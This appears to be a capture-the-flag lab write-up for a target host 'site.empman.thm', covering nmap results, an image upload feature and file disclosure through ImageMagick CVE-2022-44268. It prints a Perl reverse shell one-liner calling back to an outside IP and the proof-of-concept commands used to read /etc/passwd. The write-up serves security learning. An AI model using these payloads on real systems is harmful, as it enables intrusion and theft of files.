### Nmap

```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e6:b7:14:81:2d:c6:43:bd:f7:8e:ee:b3:7e:32:d3:09 (RSA)
|   256 7d:64:9d:6c:8d:24:9d:53:b4:7a:ac:c8:f9:da:8b:74 (ECDSA)
|_  256 d1:30:1a:39:c6:46:9a:47:91:12:c6:4d:0d:b9:4e:26 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 404 Not Found
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

Nmap shows that port 80 is open but we get an error code 404 when trying to access it from the web browser, with a message that site.empman.thm is not recognized so I tried adding the host name to the hosts file:

![[Pasted image 20231123130801.png]]

Now we can access http://site.empman.thm:

![[Pasted image 20231123130904.png]]

Can edit the photo that get shown in the home page:

![[Pasted image 20231123132256.png]]

The site only accepts PNG images.

I will attempt to upload the following shell:
`perl -e 'use Socket;$i="10.13.31.71";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

After some searching I found the following exploit of imagemagic in github:
https://github.com/Vulnmachines/imagemagick-CVE-2022-44268

I cloned the project, then the following command generated a PNG image that the site accepted:
`python3 poc.py generate -o exploit.png -r /etc/passwd`

Than I downloaded the uploaded image from the home page and was able to see the contents of the `/etc/passwd` file with the following command:
`python3 poc.py parse -i out.png`

